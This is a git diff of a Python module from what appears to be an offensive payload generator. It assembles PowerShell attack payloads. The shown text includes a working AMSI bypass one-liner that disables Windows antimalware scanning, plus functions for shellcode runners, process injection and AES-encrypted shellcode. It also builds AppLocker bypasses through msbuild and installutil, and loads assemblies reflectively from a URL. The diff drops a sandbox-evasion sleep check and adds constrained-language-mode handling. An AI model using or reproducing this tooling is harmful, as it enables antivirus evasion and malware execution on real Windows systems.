@@ -6,18 +6,8 @@ from .utils import *
 
 path = os.path.dirname(__file__)
 
-amsi = '''
+amsi_bypass = '''
 Foreach($type in [Ref].Assembly.GetTypes()){if($type.Name -like "*iuti*"){Foreach($field in $type.GetFields('NonPublic,Static')){if($field.Name -like "*iinit*"){$field.SetValue(0,$true)}}}}
-'''
-
-delay = '''
-$now = [DateTime]::Now
-Start-Sleep -Seconds $DELAY
-$deltaT = ([DateTime]::Now).Subtract($now).TotalSeconds
-
-if ($deltaT -lt ($DELAY - 0.5)) {
-    exit
-}
 '''
 
 shellcode ='''
@@ -88,14 +78,12 @@ def bytes_to_ps(data):
     hex_bytes = [f'0x{b:02X}' for b in data]
     return ', '.join(hex_bytes)
 
-def av_bypass(shellcode, encrypt, key, iv, time, amsi_bypass):
+def av_bypass(shellcode, encrypt, key, iv, amsi, clm):
     payload = '$buf  = {{SHELLCODE}}'
     render(payload, shellcode=bytes_to_ps(shellcode))
-    if delay:
-        payload += render(delay, delay=time)
     
-    if amsi_bypass:
-        payload += amsi
+    if amsi and not clm:
+        payload += amsi_bypass
 
     if encrypt.upper() == 'AES':
         payload += render(aes, key=bytes_to_ps(key), iv=bytes_to_ps(iv))
@@ -106,23 +94,23 @@ def av_bypass(shellcode, encrypt, key, iv, time, amsi_bypass):
 
     return payload
 
-def shellcode_runner(shellcode, encrypt, key, iv, delay, amsi):
+def shellcode_runner(shellcode, encrypt, key, iv, amsi_bypass, clm):
     with open(os.path.join(path, 'templates/ps/shellcode_runner.ps1'), 'r') as f:
         code = f.read()
-    payload = av_bypass(shellcode, encrypt, key, iv, delay, amsi)
+    payload = av_bypass(shellcode, encrypt, key, iv, amsi_bypass, clm)
     return render(code, payload=payload)
 
-def process_injection(shellcode, encrypt, key, iv, delay, amsi, process):
+def process_injection(shellcode, encrypt, key, iv, amsi_bypass, process, clm):
     with open(os.path.join(path, 'templates/ps/process_injection.ps1'), 'r') as f:
         code = f.read()
-    payload = av_bypass(shellcode, encrypt, key, iv, delay, amsi)
+    payload = av_bypass(shellcode, encrypt, key, iv, amsi_bypass, clm)
     process_name = os.path.splitext(os.path.basename(process.replace('\\','/')))[0]
     return render(code, payload=payload, process=process_name)
 
-def applocker_bypass(applocker, url, path, name, arch, amsi_bypass):
+def applocker_bypass(applocker, url, path, name, arch, amsi, clm):
     payload = ''
-    if amsi_bypass:
-        payload += amsi
+    if amsi and not clm:
+        payload += amsi_bypass
     
     if applocker == 'msbuild':
         payload += msbuild
@@ -132,9 +120,9 @@ def applocker_bypass(applocker, url, path, name, arch, amsi_bypass):
         payload += installutil
     return render(payload, url=url, path=path, name=name, arch=arch)
 
-def assembly_reflection(url, amsi_bypass):
+def assembly_reflection(url, amsi, clm):
     payload = ''
-    if amsi_bypass:
-        payload += amsi
+    if amsi and not clm:
+        payload += amsi_bypass
     payload += render(assembly_load, url=url)
     return payload
